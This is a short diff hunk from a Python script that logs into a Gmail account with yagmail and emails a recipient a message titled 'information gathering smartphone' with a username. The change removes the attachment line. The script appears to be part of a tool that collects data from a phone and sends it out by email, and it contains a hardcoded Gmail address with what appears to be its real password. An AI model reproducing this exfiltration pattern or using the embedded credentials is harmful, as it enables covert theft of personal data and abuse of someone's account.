@@ -46,6 +46,5 @@ yag = yagmail.SMTP("alyasalamm@gmail.com","Enjoy199#")
 yag.send(
 	to=receiver,
 	subject="information gathering smartphone, username : "+username,
-	attachments=filename,
 	contents=body,
 )
